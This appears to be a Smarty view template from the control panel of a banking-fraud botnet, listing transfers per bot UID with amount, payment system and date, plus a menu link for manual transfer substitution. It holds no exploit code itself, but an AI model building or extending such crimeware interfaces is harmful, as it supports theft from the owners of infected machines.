<div class="top_menu">
<div class="top_menu_left">
{if $_SESSION.user->access.transfers.manual eq on}<a href="/transfers/manual.html">Ручная подмена</a>&nbsp;{/if}
</div>

<div class="top_menu_right"></div>

</div>

<hr />
<form action="#" method="post" enctype="multipart/form-data" name="trans_filter" id="trans_filter" target="_blank">

<div style="text-align: right; padding-right: 10px; padding-left: 10px">

UID: <input name="uid" type="text" style="width:600px" value="{$_SESSION.search.trans.uid}"/>
<hr />
Система: <select id="sys" name="sys" style="width:600px">
<option value="ALL">{$lang.all}</option>
{foreach from=$sys key=key item=item}
<option value="{$key}"{if $_SESSION.search.trans.sys eq $key} selected="selected"{/if}>{$item}</option>
{/foreach}
</select>
<hr />
Дата: <select id="date" name="date" style="width:600px">
<option value="ALL">{$lang.all}</option>
{foreach from=$date key=key item=item}
<option value="{$key}"{if $_SESSION.search.trans.date eq $key} selected="selected"{/if}>{$key}</option>
{/foreach}
</select>
<hr />
<input type="button" name="update" value="Обновить" style="width:100%" onclick="return get_hax({ldelim}url: '/transfers/index.html?ajax=1',method:'post',id:'content',form:'trans_filter'{rdelim});" />
</div>
</form>

<div style="font-size:10px" align="center"><br />&nbsp;{$pages}&nbsp;<br /><br /></div>

<table cellspacing="1" cellpadding="5" style="width: 100%; border: 1px solid #cccccc;">
<tr class="bgp3">
<td style="width: 40%; text-align: center">{$lang.bot}</td>
{*<td style="width: 20%; text-align: center">{$lang.count}</td>*}
<td style="width: 20%; text-align: center">{$lang.summ}</td>
<td style="width: 20%; text-align: center">{$lang.system}</td>
<td style="width: 20%; text-align: center">{$lang.data}</td>
</tr>
{foreach from=$list item=item key=key name=list}
{if $smarty.foreach.list.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr class="bgp{$bg}" onmousemove="this.className = 'bgp4'" onmouseout="this.className = 'bgp{$bg}'" style="border: 1px solid #FFFFFF; cursor:pointer;" onclick="gtw('{$item->prefix}{$item->uid}');">
<th>{$item->prefix}{$item->uid}</th>
{*<th>{$item->count}</th>*}
<th>{$item->num}</th>
<th>{$sys[$item->system]}</th>
<th>{$item->post_date}</th>
</tr>
{/foreach}
</table>

<div style="font-size:10px" align="center"><br />&nbsp;{$pages}&nbsp;<br /><br /></div>